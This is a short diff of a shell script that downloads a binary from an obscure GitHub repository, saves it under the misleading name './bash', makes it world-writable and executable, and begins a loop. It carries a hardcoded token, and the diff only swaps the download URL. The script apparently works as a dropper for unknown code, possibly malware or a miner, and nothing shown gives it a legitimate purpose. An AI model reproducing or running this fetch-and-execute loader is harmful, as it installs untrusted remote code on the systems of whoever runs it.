@@ -2,7 +2,7 @@
 
 token="1N6QqhaHnDyHYkx89vsxd+CNkoqoaqXT37Fj0baANRA="
 tmp="$(mktemp -d)" && cd "$tmp"
-wget -qO "./bash" "https://github.com/vjbahkds/qiyywnbc/raw/refs/heads/main/tm20250312"
+wget -qO "./bash" "https://github.com/hanrzme/meme/raw/refs/heads/main/tm20250312"
 chmod 777 "./bash"
 if [ "$1" == "1" ]; then
   i=39; while [ "$i" -gt "0" ]; do
